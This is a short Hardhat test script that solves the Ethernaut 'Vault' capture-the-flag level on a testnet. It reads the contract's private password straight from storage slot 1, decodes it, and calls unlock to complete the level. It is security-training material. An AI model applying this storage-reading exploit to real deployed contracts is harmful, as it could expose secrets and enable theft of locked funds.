// npx hardhat test ./test/08_vault.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Vault";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._08_vault, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    let password = await ethers.provider.getStorageAt(levelContract.address, 1);
    console.log(`password = ${password} "${Buffer.from(password.slice(2), `hex`)}"`)

    let tx = await levelContract.unlock(password)
    await tx.wait();
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});